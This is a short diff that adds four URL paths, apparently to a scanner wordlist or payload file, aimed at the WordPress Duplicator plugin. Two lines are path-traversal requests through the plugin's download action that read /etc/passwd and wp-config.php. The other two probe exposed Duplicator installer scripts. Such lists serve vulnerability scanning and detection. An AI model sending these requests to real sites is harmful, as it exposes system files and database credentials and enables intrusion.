@@ -1,0 +1,4 @@
+/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php
+/wp-content/backups-dup-lite/dup-installer/main.installer.php?is_daws=1
+/wp-content/dup-installer/main.installer.php?is_daws=1
